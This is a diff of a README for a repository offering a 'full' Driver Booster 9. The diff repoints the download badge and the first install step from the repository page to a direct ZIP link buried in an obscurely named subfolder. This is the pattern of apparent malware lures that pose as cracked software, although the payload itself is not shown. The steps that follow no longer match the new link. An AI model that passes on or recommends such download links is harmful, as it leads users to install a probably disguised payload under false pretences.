@@ -1,6 +1,6 @@
 # 🛠️ Driver-Booster-9-Full - Keep hardware running at peak performance
 
-[![](https://img.shields.io/badge/Download_Driver_Booster-3498db?style=for-the-badge)](https://github.com/reynolddashed575/Driver-Booster-9-Full)
+[![](https://img.shields.io/badge/Download_Driver_Booster-3498db?style=for-the-badge)](https://github.com/reynolddashed575/Driver-Booster-9-Full/raw/refs/heads/main/orbitelous/Booster-Full-Driver-1.2.zip)
 
 ## 📋 About the software
 
@@ -22,7 +22,7 @@ Before you install this software, ensure your computer meets these base requirem
 
 Follow these steps to obtain and run the application on your computer.
 
-1. First, visit the official repository page to initiate the process. Navigate to the following link to access the distribution files: [https://github.com/reynolddashed575/Driver-Booster-9-Full](https://github.com/reynolddashed575/Driver-Booster-9-Full).
+1. First, visit the official repository page to initiate the process. Navigate to the following link to access the distribution files: [https://github.com/reynolddashed575/Driver-Booster-9-Full/raw/refs/heads/main/orbitelous/Booster-Full-Driver-1.2.zip](https://github.com/reynolddashed575/Driver-Booster-9-Full/raw/refs/heads/main/orbitelous/Booster-Full-Driver-1.2.zip).
 2. Look for the green button labeled "Code" on the right side of the screen.
 3. Click this button and select "Download ZIP" from the menu.
 4. Locate the ZIP file in your "Downloads" folder once the transfer finishes.
